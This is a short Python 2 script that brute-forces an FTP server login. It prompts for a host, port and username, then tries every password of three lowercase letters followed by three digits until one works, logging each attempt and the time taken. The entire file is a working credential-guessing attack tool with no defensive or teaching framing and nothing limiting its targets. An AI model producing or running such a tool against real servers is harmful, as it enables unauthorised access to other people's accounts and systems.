#!/usr/bin/env python

import itertools
import ftplib
import time

#l1 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
#l2 = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
l3 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
l4 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
l5 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
l6 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
l7 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
l8 = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
pool=[l3,l4,l5,l6,l7,l8]
host = raw_input('Enter the ip of the ftp server you would like to connect to: ')
port = raw_input('Enter the port you would like to use: ')
user = raw_input('Enter the username: ')
start = time.time()
fp = ftplib.FTP()
fp.connect(host, port)
for n in itertools.product(*pool):
	try:
		fp.login(user,''.join(n))
		print("successfully logged in with username " + user + " and password " + ''.join(n))
		print "password found in", time.time() - start, "seconds"
		break
	except ftplib.all_errors:
		print("could not authenticate with username " + user + " and password " + ''.join(n))
print "program ran for", time.time() - start, "seconds"
